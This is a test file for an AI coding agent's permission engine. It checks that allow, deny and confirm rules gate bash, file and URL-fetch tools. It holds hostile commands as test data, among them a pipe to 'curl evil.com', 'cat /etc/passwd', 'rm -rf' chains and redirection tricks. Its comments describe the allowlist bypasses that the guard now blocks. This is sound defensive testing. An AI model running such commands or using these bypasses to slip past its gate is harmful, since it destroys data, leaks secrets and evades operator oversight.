import { beforeAll, describe, expect, test } from 'bun:test';
import { initBashParser } from '../../src/permissions/bash-parser.ts';
import { createPermissionEngine } from '../../src/permissions/engine.ts';
import type { Policy } from '../../src/permissions/types.ts';

// Bash resolver (slice 6) walks the tree-sitter-bash AST. Init is
// async + idempotent; needs to complete before any engine.check on
// the bash category fires.
beforeAll(async () => {
  await initBashParser();
});

const CWD = '/proj';

const policy = (p: Partial<Policy>): Policy => ({
  defaults: { mode: 'strict' },
  tools: {},
  ...p,
});

describe('engine.check (bash)', () => {
  test('allows commands matching allow rules', () => {
    const eng = createPermissionEngine(
      policy({ tools: { bash: { allow: ['ls *', 'git status'] } } }),
      { cwd: CWD },
    );
    expect(eng.check('bash', 'bash', { command: 'ls -la' }).kind).toBe('allow');
    expect(eng.check('bash', 'bash', { command: 'git status' }).kind).toBe('allow');
  });

  test('denies commands matching deny rules even if also in allow', () => {
    const eng = createPermissionEngine(
      policy({
        tools: { bash: { allow: ['rm *'], deny: ['rm -rf *'] } },
      }),
      { cwd: CWD },
    );
    const d = eng.check('bash', 'bash', { command: 'rm -rf /' });
    expect(d.kind).toBe('deny');
  });

  test('returns confirm decision for confirm rules', () => {
    const eng = createPermissionEngine(policy({ tools: { bash: { confirm: ['git push *'] } } }), {
      cwd: CWD,
    });
    const d = eng.check('bash', 'bash', { command: 'git push origin main' });
    expect(d.kind).toBe('confirm');
    if (d.kind === 'confirm') {
      expect(d.prompt).toContain('git push origin main');
    }
  });

  test('default-denies when no rule matches', () => {
    const eng = createPermissionEngine(policy({}), { cwd: CWD });
    expect(eng.check('bash', 'bash', { command: 'whoami' }).kind).toBe('deny');
  });

  test('rejects bash with no command argument', () => {
    const eng = createPermissionEngine(policy({}), { cwd: CWD });
    expect(eng.check('bash', 'bash', {}).kind).toBe('deny');
  });
});

describe('engine.check (paths)', () => {
  test('write_file: allow_paths matches', () => {
    const eng = createPermissionEngine(
      policy({ tools: { write_file: { allow_paths: ['src/**'] } } }),
      { cwd: CWD },
    );
    expect(eng.check('write_file', 'fs.write', { path: 'src/foo.ts' }).kind).toBe('allow');
  });

  test('write_file: deny_paths wins over allow_paths', () => {
    const eng = createPermissionEngine(
      policy({
        tools: { write_file: { allow_paths: ['**'], deny_paths: ['**/.env*'] } },
      }),
      { cwd: CWD },
    );
    expect(eng.check('write_file', 'fs.write', { path: 'src/.env' }).kind).toBe('deny');
    expect(eng.check('write_file', 'fs.write', { path: 'src/foo.ts' }).kind).toBe('allow');
  });

  test('read_file: deny_paths blocks reads', () => {
    const eng = createPermissionEngine(
      policy({ tools: { read_file: { deny_paths: ['**/.env*'] } } }),
      { cwd: CWD },
    );
    expect(eng.check('read_file', 'fs.read', { path: '.env.production' }).kind).toBe('deny');
  });

  test('confirm_paths returns a confirm decision', () => {
    const eng = createPermissionEngine(
      policy({ tools: { write_file: { confirm_paths: ['package.json'] } } }),
      { cwd: CWD },
    );
    const d = eng.check('write_file', 'fs.write', { path: 'package.json' });
    expect(d.kind).toBe('confirm');
  });

  test('default-denies when no rule matches', () => {
    const eng = createPermissionEngine(policy({}), { cwd: CWD });
    expect(eng.check('write_file', 'fs.write', { path: 'src/foo.ts' }).kind).toBe('deny');
  });

  test('rejects write with no path argument', () => {
    const eng = createPermissionEngine(policy({}), { cwd: CWD });
    expect(eng.check('write_file', 'fs.write', {}).kind).toBe('deny');
  });
});

describe('engine modes', () => {
  test('bypass mode allows everything regardless of rules', () => {
    const eng = createPermissionEngine(
      policy({
        defaults: { mode: 'bypass' },
        tools: { bash: { deny: ['rm -rf *'] } },
      }),
      { cwd: CWD },
    );
    expect(eng.check('bash', 'bash', { command: 'rm -rf /' }).kind).toBe('allow');
  });

  test('acceptEdits default-denies unmatched writes (mode is convenience, not bypass)', () => {
    const eng = createPermissionEngine(policy({ defaults: { mode: 'acceptEdits' } }), { cwd: CWD });
    expect(eng.check('write_file', 'fs.write', { path: 'src/foo.ts' }).kind).toBe('deny');
  });

  test('acceptEdits default-denies unmatched reads', () => {
    const eng = createPermissionEngine(policy({ defaults: { mode: 'acceptEdits' } }), { cwd: CWD });
    expect(eng.check('read_file', 'fs.read', { path: 'src/foo.ts' }).kind).toBe('deny');
  });

  test('acceptEdits auto-allows confirm_paths for writes (skip confirm step)', () => {
    const eng = createPermissionEngine(
      policy({
        defaults: { mode: 'acceptEdits' },
        tools: { write_file: { confirm_paths: ['package.json'] } },
      }),
      { cwd: CWD },
    );
    const d = eng.check('write_file', 'fs.write', { path: 'package.json' });
    expect(d.kind).toBe('allow');
    if (d.kind === 'allow') {
      expect(d.reason).toContain('acceptEdits');
    }
  });

  test('acceptEdits still confirms confirm_paths for reads', () => {
    const eng = createPermissionEngine(
      policy({
        defaults: { mode: 'acceptEdits' },
        tools: { read_file: { confirm_paths: ['secrets.txt'] } },
      }),
      { cwd: CWD },
    );
    const d = eng.check('read_file', 'fs.read', { path: 'secrets.txt' });
    expect(d.kind).toBe('confirm');
  });

  test('acceptEdits still honors deny_paths over confirm_paths', () => {
    const eng = createPermissionEngine(
      policy({
        defaults: { mode: 'acceptEdits' },
        tools: {
          write_file: { confirm_paths: ['**/.env*'], deny_paths: ['**/.env.production'] },
        },
      }),
      { cwd: CWD },
    );
    expect(eng.check('write_file', 'fs.write', { path: '.env.production' }).kind).toBe('deny');
  });
});

describe('engine.check (web.fetch)', () => {
  test('host allow/deny', () => {
    const eng = createPermissionEngine(
      policy({
        tools: { fetch_url: { allow_hosts: ['*.public.com'], deny_hosts: ['*.internal'] } },
      }),
      { cwd: CWD },
    );
    expect(eng.check('fetch_url', 'web.fetch', { url: 'https://api.public.com/x' }).kind).toBe(
      'allow',
    );
    expect(eng.check('fetch_url', 'web.fetch', { url: 'https://api.internal/x' }).kind).toBe(
      'deny',
    );
  });

  test('rejects malformed URL', () => {
    const eng = createPermissionEngine(policy({}), { cwd: CWD });
    expect(eng.check('fetch_url', 'web.fetch', { url: 'not a url' }).kind).toBe('deny');
  });
});

describe('engine.check (search tools: glob/grep)', () => {
  test('glob with no `cwd` arg falls back to session cwd', () => {
    const eng = createPermissionEngine(policy({ tools: { glob: { allow_paths: ['./**'] } } }), {
      cwd: CWD,
    });
    const d = eng.check('glob', 'fs.read', { pattern: 'src/**/*.ts' });
    expect(d.kind).toBe('allow');
  });

  test('glob with explicit `cwd` arg matches against allow_paths', () => {
    const eng = createPermissionEngine(policy({ tools: { glob: { allow_paths: ['src/**'] } } }), {
      cwd: CWD,
    });
    const d = eng.check('glob', 'fs.read', { pattern: '**/*.ts', cwd: 'src' });
    expect(d.kind).toBe('allow');
  });

  test('grep with no `path` arg falls back to session cwd', () => {
    const eng = createPermissionEngine(policy({ tools: { grep: { allow_paths: ['./**'] } } }), {
      cwd: CWD,
    });
    const d = eng.check('grep', 'fs.read', { pattern: 'foo' });
    expect(d.kind).toBe('allow');
  });

  test('grep with explicit `path` arg matches against allow_paths', () => {
    const eng = createPermissionEngine(policy({ tools: { grep: { allow_paths: ['src/**'] } } }), {
      cwd: CWD,
    });
    const d = eng.check('grep', 'fs.read', { pattern: 'foo', path: 'src' });
    expect(d.kind).toBe('allow');
  });

  test('grep with explicit `path` outside allow_paths is denied', () => {
    const eng = createPermissionEngine(policy({ tools: { grep: { allow_paths: ['src/**'] } } }), {
      cwd: CWD,
    });
    const d = eng.check('grep', 'fs.read', { pattern: 'foo', path: 'docs' });
    expect(d.kind).toBe('deny');
  });

  test('grep rooted at a deny_paths directory is rejected (literal match)', () => {
    // The synthetic-descendant probe alone wouldn't fire because
    // `secrets/**` doesn't match `secrets/.forja-check`'s deny check
    // unless the deny pattern itself reaches descendants. Instead the
    // engine also matches the literal root for search tools.
    const eng = createPermissionEngine(
      policy({
        tools: { grep: { allow_paths: ['**'], deny_paths: ['secrets'] } },
      }),
      { cwd: CWD },
    );
    expect(eng.check('grep', 'fs.read', { pattern: 'foo', path: 'secrets' }).kind).toBe('deny');
  });

  test('glob/grep still default-deny when no allow_paths configured', () => {
    const eng = createPermissionEngine(policy({}), { cwd: CWD });
    expect(eng.check('glob', 'fs.read', { pattern: 'src/**' }).kind).toBe('deny');
    expect(eng.check('grep', 'fs.read', { pattern: 'foo' }).kind).toBe('deny');
  });

  test('glob with non-string cwd is denied (does not crash on path.resolve)', () => {
    const eng = createPermissionEngine(
      policy({ tools: { glob: { allow_paths: ['./**'], deny_paths: ['secrets'] } } }),
      { cwd: CWD },
    );
    // Cast bypasses TS — model JSON can carry any shape at runtime.
    const d = eng.check('glob', 'fs.read', {
      cwd: 123,
    } as unknown as Parameters<typeof eng.check>[2]);
    expect(d.kind).toBe('deny');
    if (d.kind === 'deny') expect(d.reason).toContain('non-string');
  });

  test('grep with non-string path is denied (does not crash on path.resolve)', () => {
    const eng = createPermissionEngine(
      policy({ tools: { grep: { allow_paths: ['./**'], deny_paths: ['secrets'] } } }),
      { cwd: CWD },
    );
    const d = eng.check('grep', 'fs.read', {
      path: ['oops'],
    } as unknown as Parameters<typeof eng.check>[2]);
    expect(d.kind).toBe('deny');
  });

  test('read_file with non-string path is denied (regression)', () => {
    const eng = createPermissionEngine(policy({ tools: { read_file: { allow_paths: ['**'] } } }), {
      cwd: CWD,
    });
    const d = eng.check('read_file', 'fs.read', {
      path: { not: 'a string' },
    } as unknown as Parameters<typeof eng.check>[2]);
    expect(d.kind).toBe('deny');
  });
});

describe('engine misc category', () => {
  test('misc tools auto-allow (no gate yet)', () => {
    const eng = createPermissionEngine(policy({}), { cwd: CWD });
    expect(eng.check('todo_write', 'misc', {}).kind).toBe('allow');
  });
});

describe('engine.policy() returns a deep copy', () => {
  test('mutating the returned policy does NOT affect the engine', () => {
    // Subagent runtime serializes the engine's policy into
    // `subagent_runs.policy_snapshot` for the subprocess child.
    // If `policy()` returned the captured reference, a caller
    // could silently corrupt the engine's enforcement state by
    // mutating any nested field. structuredClone defends.
    const eng = createPermissionEngine(policy({ tools: { bash: { allow: ['echo *'] } } }), {
      cwd: CWD,
    });
    const snap = eng.policy();
    // Verify the snapshot reflects the engine's state.
    expect(snap.defaults.mode).toBe('strict');
    expect(snap.tools.bash).toEqual({ allow: ['echo *'] });
    // Mutate the snapshot at the deepest level a consumer could
    // touch — top-level field, nested object, nested array.
    snap.defaults.mode = 'bypass';
    const bashRule = snap.tools.bash as { allow?: string[] };
    if (bashRule.allow !== undefined) bashRule.allow.push('rm -rf /');
    // Engine's enforcement is untouched. mode() still strict;
    // the dangerous command is still denied.
    expect(eng.mode()).toBe('strict');
    expect(eng.check('bash', 'bash', { command: 'rm -rf /' }).kind).toBe('deny');
    // A fresh `policy()` call returns the original shape — the
    // mutation didn't leak back through the closure.
    const snap2 = eng.policy();
    expect(snap2.defaults.mode).toBe('strict');
    expect(snap2.tools.bash).toEqual({ allow: ['echo *'] });
  });
});

describe('compound command guard (shell injection defense)', () => {
  test('compound command with ; forces confirm even when allow rule matches the prefix', () => {
    // The bug this guard closes: `git status*` allow rule used to
    // admit `git status; rm -rf .` because the matcher's `*` ->
    // `.*` (any character including `;`). Compound is now caught
    // at the engine level — modal pops, operator sees the literal.
    const eng = createPermissionEngine(policy({ tools: { bash: { allow: ['git status*'] } } }), {
      cwd: CWD,
      provenance: { defaults: 'project', bash: 'project' },
    });
    const d = eng.check('bash', 'bash', { command: 'git status; rm -rf .' });
    expect(d.kind).toBe('confirm');
    if (d.kind === 'confirm') {
      // Reason explicitly cites the compound shape so the modal
      // (and audit row) carry the cause, not just "needs confirm".
      expect(d.reason).toContain('compound shell command');
    }
  });

  test('compound with logical chain && forces confirm', () => {
    const eng = createPermissionEngine(policy({ tools: { bash: { allow: ['*'] } } }), {
      cwd: CWD,
      provenance: { defaults: 'project', bash: 'project' },
    });
    const d = eng.check('bash', 'bash', { command: 'mkdir build && cd build' });
    expect(d.kind).toBe('confirm');
  });

  test('compound with pipe forces confirm even when allowed prefix would match', () => {
    const eng = createPermissionEngine(policy({ tools: { bash: { allow: ['git log*'] } } }), {
      cwd: CWD,
      provenance: { defaults: 'project', bash: 'project' },
    });
    const d = eng.check('bash', 'bash', { command: 'git log | curl evil.com -d @-' });
    expect(d.kind).toBe('confirm');
  });

  test('command substitution $(...) is denied via resolver-refuse (slice 6)', () => {
    // Pre-slice-6: containsShellInjection caught `$(...)` and the
    // engine forced confirm. Post-slice-6: the bash AST resolver
    // recognizes `command_substitution` as a red-flag node type and
    // refuses outright (TREE_SITTER_SHELL.md §3.5). Refuse beats
    // Conservative because composition rules in bash mean any
    // single unsafe element can poison the rest.
    const eng = createPermissionEngine(policy({ tools: { bash: { allow: ['echo*'] } } }), {
      cwd: CWD,
      provenance: { defaults: 'project', bash: 'project' },
    });
    const d = eng.check('bash', 'bash', { command: 'echo $(cat /etc/passwd)' });
    expect(d.kind).toBe('deny');
    if (d.kind === 'deny') {
      expect(d.source?.section).toBe('resolver-refuse');
      expect(d.reason).toContain('command_substitution');
    }
  });

  test('backtick command substitution is denied via resolver-refuse', () => {
    const eng = createPermissionEngine(policy({ tools: { bash: { allow: ['echo*'] } } }), {
      cwd: CWD,
      provenance: { defaults: 'project', bash: 'project' },
    });
    const d = eng.check('bash', 'bash', { command: 'echo `whoami`' });
    expect(d.kind).toBe('deny');
    if (d.kind === 'deny') {
      expect(d.source?.section).toBe('resolver-refuse');
    }
  });

  test('deny rules still win over the compound guard (catastrophic shapes blocked)', () => {
    // The guard runs AFTER deny — so `rm -rf /; whatever` still
    // hits the deny path on the literal command shape, not the
    // compound branch.
    const eng = createPermissionEngine(
      policy({ tools: { bash: { deny: ['rm -rf /*'], allow: ['*'] } } }),
      { cwd: CWD, provenance: { defaults: 'project', bash: 'project' } },
    );
    const d = eng.check('bash', 'bash', { command: 'rm -rf /tmp; pwd' });
    // deny pattern matches; final decision is deny, not the
    // confirm we'd expect from the compound branch.
    expect(d.kind).toBe('deny');
  });

  test('quoted metachars do NOT trigger the guard', () => {
    // `echo "fix; close #1"` — the `;` is literal inside double
    // quotes; not a real injection. The matcher correctly treats
    // it as part of the message. Uses echo (pure-output, score 0,
    // high confidence) so the §6.6 approval-gate doesn't shadow
    // the compound-guard signal we're testing for.
    const eng = createPermissionEngine(policy({ tools: { bash: { allow: ['echo *'] } } }), {
      cwd: CWD,
      provenance: { defaults: 'project', bash: 'project' },
    });
    const d = eng.check('bash', 'bash', {
      command: 'echo "fix; close #1"',
    });
    // Allow rule fires normally; no compound detected.
    expect(d.kind).toBe('allow');
  });

  test('compound with unknown commands lands as resolver-refuse (slice 6)', () => {
    // Pre-slice-6: containsShellInjection saw `;` and forced
    // confirm with bash-section attribution. Post-slice-6: AST
    // resolver checks each command in the sequence against the
    // COMMAND_TABLE. Two unknown names → refuse; attribution
    // shifts to `resolver-refuse` because the failure is
    // structural (closed whitelist), not policy-driven.
    const eng = createPermissionEngine(policy({ tools: { bash: { allow: ['*'] } } }), {
      cwd: CWD,
      provenance: { defaults: 'project', bash: 'user' },
    });
    const d = eng.check('bash', 'bash', { command: 'a; b' });
    expect(d.kind).toBe('deny');
    if (d.kind === 'deny') {
      expect(d.source?.section).toBe('resolver-refuse');
    }
  });

  test('newline-injected command is NOT silently allowed by glob with dotAll', () => {
    // The exact bypass: with `git status -*` allow, the matcher
    // compiles `*` -> `.*` with dotAll so `.` includes `\n`. Without
    // a newline check in the compound guard, the regex matches
    // the entire two-line input and the second command runs
    // silently. The init-template default's `git status -*` allow
    // entry is the realistic vector — operator-authored YAML
    // explicitly wants to allowlist `git status -s`, `git status
    // --porcelain`, etc., and ends up admitting injection.
    const eng = createPermissionEngine(policy({ tools: { bash: { allow: ['git status -*'] } } }), {
      cwd: CWD,
      provenance: { defaults: 'project', bash: 'project' },
    });
    const d = eng.check('bash', 'bash', { command: 'git status -s\nrm -rf /tmp/pwn' });
    expect(d.kind).toBe('confirm');
    if (d.kind === 'confirm') {
      expect(d.reason).toContain('compound shell command');
    }
  });

  test('CRLF and CR-only line endings still force confirm', () => {
    // Conservative: CRLF inputs (Windows line endings, web-form
    // pastes) and CR-only (very rare) shouldn't slip past the
    // gate just because the line ending isn't `\n`.
    const eng = createPermissionEngine(policy({ tools: { bash: { allow: ['git status*'] } } }), {
      cwd: CWD,
      provenance: { defaults: 'project', bash: 'project' },
    });
    expect(eng.check('bash', 'bash', { command: 'git status\r\nrm -rf .' }).kind).toBe('confirm');
    expect(eng.check('bash', 'bash', { command: 'git status\rrm -rf .' }).kind).toBe('confirm');
  });

  test('multi-line allow pattern (heredoc) still matches when no separator outside quotes', () => {
    // Counter-test for the dotAll feature the matcher relies on:
    // legitimate multi-line commands with newlines INSIDE quoted
    // strings or escaped via line-continuation must not regress.
    // `python -c "for i in range(3):\n  print(i)"` should match
    // `python -c *` and pass through allow normally — newline is
    // inside double quotes, the guard does not flag.
    const eng = createPermissionEngine(policy({ tools: { bash: { allow: ['python -c *'] } } }), {
      cwd: CWD,
      provenance: { defaults: 'project', bash: 'project' },
    });
    const d = eng.check('bash', 'bash', {
      command: 'python -c "for i in range(3):\n  print(i)"',
    });
    expect(d.kind).toBe('allow');
  });

  test('lone & forces confirm (async control operator is a separator)', () => {
    // The reported bypass: `git status & rm -rf /tmp/...` against
    // an allow `git status*` was admitted because the previous guard
    // only flagged `&&`. Bare `&` backgrounds the first command and
    // immediately runs the second — same compound shape as `;`.
    const eng = createPermissionEngine(policy({ tools: { bash: { allow: ['git status*'] } } }), {
      cwd: CWD,
      provenance: { defaults: 'project', bash: 'project' },
    });
    const d = eng.check('bash', 'bash', { command: 'git status & rm -rf /tmp/pwn' });
    expect(d.kind).toBe('confirm');
    if (d.kind === 'confirm') {
      expect(d.reason).toContain('compound shell command');
    }
  });

  test('trailing & also forces confirm (no structural distinction from chained &)', () => {
    // `sleep 30 &` has the same metachar shape as `sleep 30 & rm`.
    // The policy gate cannot tell the agent's intent apart from the
    // string alone; conservative confirm. Operator who legitimately
    // wants to background a process session-allows the literal.
    const eng = createPermissionEngine(policy({ tools: { bash: { allow: ['sleep*'] } } }), {
      cwd: CWD,
      provenance: { defaults: 'project', bash: 'project' },
    });
    const d = eng.check('bash', 'bash', { command: 'sleep 30 &' });
    expect(d.kind).toBe('confirm');
  });

  test('process substitution is denied via resolver-refuse (slice 6)', () => {
    // Pre-slice-6: forced confirm via the compound guard.
    // Post-slice-6: `process_substitution` is a red-flag node type
    // in the AST whitelist — refused before the rule pipeline runs.
    const eng = createPermissionEngine(policy({ tools: { bash: { allow: ['cat *'] } } }), {
      cwd: CWD,
      provenance: { defaults: 'project', bash: 'project' },
    });
    const d = eng.check('bash', 'bash', { command: 'cat <(rm -rf /tmp/pwn)' });
    expect(d.kind).toBe('deny');
    if (d.kind === 'deny') {
      expect(d.source?.section).toBe('resolver-refuse');
      expect(d.reason).toContain('process_substitution');
    }
  });

  test('output redirection forces confirm even when allow matches the host command', () => {
    // Reported bypass: `git status --short > /tmp/out` matches
    // an allow `git status --*` because the matcher's `*` resolves
    // to `.*` (dotAll) and spans the redirection. Without flagging
    // `>`, the nominally read-only allow turns into a silent
    // write path (creates / truncates `/tmp/out`). The guard now
    // catches every output redirection (>FILE, >>FILE, >|FILE,
    // <>FILE) so allowlist patterns can't be silently broadened
    // into write authorization.
    const eng = createPermissionEngine(policy({ tools: { bash: { allow: ['git status --*'] } } }), {
      cwd: CWD,
      provenance: { defaults: 'project', bash: 'project' },
    });
    const d = eng.check('bash', 'bash', { command: 'git status --short > /tmp/out' });
    expect(d.kind).toBe('confirm');
    if (d.kind === 'confirm') {
      expect(d.reason).toContain('compound shell command');
    }
  });

  test("backslash inside single quotes does not hide the closing ' (compound flagged)", () => {
    // Reported bypass: `echo '\\'; rm -rf /tmp/pwn` is a valid
    // bash compound — single-quoted literal backslash, then `;`
    // separator, then destructive command. The matcher used to
    // consume `\\` + the closing `'` as an escape pair, leaving
    // inSingle stuck at true and silently treating the rest as
    // still-quoted. Allow `echo *` would match the entire
    // compound and silently authorize the chained `rm -rf`.
    const eng = createPermissionEngine(policy({ tools: { bash: { allow: ['echo *'] } } }), {
      cwd: CWD,
      provenance: { defaults: 'project', bash: 'project' },
    });
    const d = eng.check('bash', 'bash', { command: "echo '\\'; rm -rf /tmp/pwn" });
    expect(d.kind).toBe('confirm');
    if (d.kind === 'confirm') {
      expect(d.reason).toContain('compound shell command');
    }
  });

  test('>&word (legacy bash redirect) forces confirm even when allow matches the host command', () => {
    // Reported bypass: `git diff --name-only >&/tmp/out` matches
    // an allow `git diff --*` because the matcher's `*` resolves
    // to `.*` (dotAll) and spans the redirection. Until the
    // matcher distinguished `>&digit/-` (fd duplication, no fs
    // touch) from `>&word` (legacy form for "redirect both
    // streams to file"), the latter slipped through and turned
    // a read-only allow into a silent write path.
    const eng = createPermissionEngine(policy({ tools: { bash: { allow: ['git diff --*'] } } }), {
      cwd: CWD,
      provenance: { defaults: 'project', bash: 'project' },
    });
    const d = eng.check('bash', 'bash', { command: 'git diff --name-only >&/tmp/out' });
    expect(d.kind).toBe('confirm');
    if (d.kind === 'confirm') {
      expect(d.reason).toContain('compound shell command');
    }
  });

  test('>&digit (fd duplication) still passes through allow rules', () => {
    // Counter-test: `>&1`, `>&2`, `>&-` are fd
    // duplication / closure — no filesystem mutation. The legacy
    // `>&word` distinction must NOT regress the common stderr-
    // merging idiom. Uses `ls` (high confidence, score 0) so the
    // §6.6 approval-gate doesn't shadow the fd-dup signal.
    const eng = createPermissionEngine(policy({ tools: { bash: { allow: ['ls*'] } } }), {
      cwd: CWD,
      provenance: { defaults: 'project', bash: 'project' },
    });
    const d = eng.check('bash', 'bash', { command: 'ls -la >&2' });
    expect(d.kind).toBe('allow');
  });

  test('bash &> redirect now forces confirm (was silent passthrough)', () => {
    // `cmd &>file` writes both stdout AND stderr to a file. The
    // previous matcher treated `&>` as a redirect operator and
    // skipped it — same hole as the bare `>` bypass. Now flags.
    // Operator who wants this can session-allow the literal.
    const eng = createPermissionEngine(policy({ tools: { bash: { allow: ['ls*'] } } }), {
      cwd: CWD,
      provenance: { defaults: 'project', bash: 'project' },
    });
    const d = eng.check('bash', 'bash', { command: 'ls &>/tmp/log' });
    expect(d.kind).toBe('confirm');
  });

  test('append redirection (>>) forces confirm', () => {
    const eng = createPermissionEngine(policy({ tools: { bash: { allow: ['echo *'] } } }), {
      cwd: CWD,
      provenance: { defaults: 'project', bash: 'project' },
    });
    const d = eng.check('bash', 'bash', { command: 'echo line >> /var/log/app.log' });
    expect(d.kind).toBe('confirm');
  });

  test('stdin redirection (< FILE) still passes through allow rules (no filesystem mutation)', () => {
    // Counter-test: `<FILE` reads from a file but doesn't mutate
    // the filesystem. The host command's allow rule already
    // authorizes stdin handling — flagging would force confirm
    // on every `python script.py < input.json` and similar
    // legitimate idioms.
    const eng = createPermissionEngine(policy({ tools: { bash: { allow: ['python *'] } } }), {
      cwd: CWD,
      provenance: { defaults: 'project', bash: 'project' },
    });
    const d = eng.check('bash', 'bash', { command: 'python script.py <input.json' });
    expect(d.kind).toBe('allow');
  });

  test('fd duplication (2>&1) still passes through allow rules', () => {
    // Counter-test: `&` inside a redirection context (`>&`, `<&`)
    // is fd duplication / closure, not a separator and not a file
    // write. Forcing confirm on every stderr merge would make
    // standard shell idioms unusable through the gate without
    // runtime promotion. Uses `ls` (high confidence, score 0) so
    // the §6.6 approval-gate doesn't shadow the fd-dup signal.
    const eng = createPermissionEngine(policy({ tools: { bash: { allow: ['ls*'] } } }), {
      cwd: CWD,
      provenance: { defaults: 'project', bash: 'project' },
    });
    const d = eng.check('bash', 'bash', { command: 'ls -la 2>&1' });
    expect(d.kind).toBe('allow');
  });

  test('line-continuation (\\\\\\n) does not falsely flag', () => {
    // Operator-authored long command split with `\\\n` is one
    // logical command. The guard's escape rule consumes the
    // backslash + newline together; no separator detected.
    const eng = createPermissionEngine(policy({ tools: { bash: { allow: ['git status*'] } } }), {
      cwd: CWD,
      provenance: { defaults: 'project', bash: 'project' },
    });
    const d = eng.check('bash', 'bash', {
      command: 'git status \\\n  --porcelain',
    });
    expect(d.kind).toBe('allow');
  });
});

describe('Decision.source provenance', () => {
  test('bash deny rule carries source.layer + rule + section', () => {
    const eng = createPermissionEngine(policy({ tools: { bash: { deny: ['rm -rf *'] } } }), {
      cwd: CWD,
      provenance: { defaults: 'project', bash: 'project' },
    });
    const d = eng.check('bash', 'bash', { command: 'rm -rf /' });
    expect(d.kind).toBe('deny');
    expect(d.source).toEqual({ layer: 'project', rule: 'rm -rf *', section: 'bash' });
  });

  test('bash allow rule carries source from the layer that wrote bash', () => {
    // `ls` is high confidence, score 0 — keeps the test focused on
    // provenance attribution (not the §6.6 approval-gate, which
    // would otherwise upgrade a medium-confidence resolver result
    // like `npm` to confirm and obscure the source check).
    const eng = createPermissionEngine(policy({ tools: { bash: { allow: ['ls*'] } } }), {
      cwd: CWD,
      provenance: { defaults: 'project', bash: 'user' },
    });
    const d = eng.check('bash', 'bash', { command: 'ls -la' });
    expect(d.kind).toBe('allow');
    expect(d.source).toEqual({ layer: 'user', rule: 'ls*', section: 'bash' });
  });

  test('bash confirm rule carries source', () => {
    const eng = createPermissionEngine(policy({ tools: { bash: { confirm: ['git push *'] } } }), {
      cwd: CWD,
      provenance: { defaults: 'project', bash: 'enterprise' },
    });
    const d = eng.check('bash', 'bash', { command: 'git push origin main' });
    expect(d.kind).toBe('confirm');
    expect(d.source).toEqual({ layer: 'enterprise', rule: 'git push *', section: 'bash' });
  });

  test('default-deny carries source.layer of the section that exists (no rule)', () => {
    // Section was set by 'project' but no rule matched. Operator
    // editing the project YAML adds the missing allow rule —
    // surfacing the layer points them at the right file.
    const eng = createPermissionEngine(policy({ tools: { bash: { allow: ['ls *'] } } }), {
      cwd: CWD,
      provenance: { defaults: 'project', bash: 'project' },
    });
    const d = eng.check('bash', 'bash', { command: 'whoami' });
    expect(d.kind).toBe('deny');
    expect(d.source).toEqual({ layer: 'project', section: 'bash' });
    // The rule field is absent — no rule matched, just the
    // section's default-deny.
    if (d.kind === 'deny') {
      expect(d.source?.rule).toBeUndefined();
    }
  });

  test('default-deny falls back to layer="default" when no layer wrote the section', () => {
    // No layer touched bash. The denial is the engine's built-in
    // strict-mode default, not a rule from any YAML.
    const eng = createPermissionEngine(policy({}), {
      cwd: CWD,
      provenance: { defaults: 'project' },
    });
    const d = eng.check('bash', 'bash', { command: 'whoami' });
    expect(d.kind).toBe('deny');
    expect(d.source).toEqual({ layer: 'default', section: 'bash' });
  });

  test('missing-arg deny carries source.layer="default" (engine-internal reject)', () => {
    // Pre-policy reject: no command arg. The denial isn't from a
    // rule — pointing the operator at any YAML would mislead.
    const eng = createPermissionEngine(policy({ tools: { bash: { allow: ['*'] } } }), {
      cwd: CWD,
      provenance: { defaults: 'user', bash: 'user' },
    });
    const d = eng.check('bash', 'bash', {});
    expect(d.kind).toBe('deny');
    expect(d.source).toEqual({ layer: 'default' });
  });

  test('fs.read deny rule carries source per-section (read_file)', () => {
    const eng = createPermissionEngine(
      policy({ tools: { read_file: { deny_paths: ['**/.env*'] } } }),
      { cwd: CWD, provenance: { defaults: 'project', read_file: 'enterprise' } },
    );
    const d = eng.check('read_file', 'fs.read', { path: '.env.production' });
    expect(d.kind).toBe('deny');
    expect(d.source).toEqual({
      layer: 'enterprise',
      rule: '**/.env*',
      section: 'read_file',
    });
  });

  test('fs.write allow + acceptEdits auto-allow keeps source from the matched rule', () => {
    const eng = createPermissionEngine(
      policy({
        defaults: { mode: 'acceptEdits' },
        tools: { write_file: { confirm_paths: ['package.json'] } },
      }),
      { cwd: CWD, provenance: { defaults: 'project', write_file: 'session' } },
    );
    const d = eng.check('write_file', 'fs.write', { path: 'package.json' });
    expect(d.kind).toBe('allow');
    expect(d.source).toEqual({
      layer: 'session',
      rule: 'package.json',
      section: 'write_file',
    });
  });

  test('web.fetch deny carries source.section="fetch_url"', () => {
    const eng = createPermissionEngine(
      policy({ tools: { fetch_url: { deny_hosts: ['evil.com'] } } }),
      { cwd: CWD, provenance: { defaults: 'project', fetch_url: 'enterprise' } },
    );
    const d = eng.check('fetch_url', 'web.fetch', { url: 'https://evil.com/x' });
    expect(d.kind).toBe('deny');
    expect(d.source).toEqual({
      layer: 'enterprise',
      rule: 'evil.com',
      section: 'fetch_url',
    });
  });

  test('bypass mode carries source.layer of the layer that chose bypass', () => {
    // Operator editing config to undo the bypass needs to know
    // which YAML set mode — pointing the modal/audit there is
    // exactly the affordance the source field provides.
    // Use a known command so the bash AST resolver doesn't refuse
    // before bypass short-circuit can fire.
    const eng = createPermissionEngine(policy({ defaults: { mode: 'bypass' } }), {
      cwd: CWD,
      provenance: { defaults: 'session' },
    });
    const d = eng.check('bash', 'bash', { command: 'ls' });
    expect(d.kind).toBe('allow');
    expect(d.source).toEqual({ layer: 'session' });
  });

  test('misc category carries source.layer="default" (no policy section)', () => {
    const eng = createPermissionEngine(policy({}), {
      cwd: CWD,
      provenance: { defaults: 'user' },
    });
    const d = eng.check('todo_write', 'misc', {});
    expect(d.kind).toBe('allow');
    expect(d.source).toEqual({ layer: 'default' });
  });

  test('engine without provenance falls back to source.layer="default" everywhere', () => {
    // Test ergonomics: an engine built from a hand-crafted Policy
    // (no resolver, no merge, no provenance) shouldn't crash —
    // sources collapse to 'default' and consumers handle it
    // gracefully.
    const eng = createPermissionEngine(policy({ tools: { bash: { deny: ['rm -rf *'] } } }), {
      cwd: CWD,
    });
    const d = eng.check('bash', 'bash', { command: 'rm -rf /' });
    expect(d.kind).toBe('deny');
    expect(d.source).toEqual({ layer: 'default', rule: 'rm -rf *', section: 'bash' });
  });
});

describe('addSessionAllow (runtime "Yes, don\'t ask again for: <rule>")', () => {
  test('bash session-allow promotes the rule into in-memory allowlist', () => {
    // First check: no rule matches, default-deny. Operator sees a
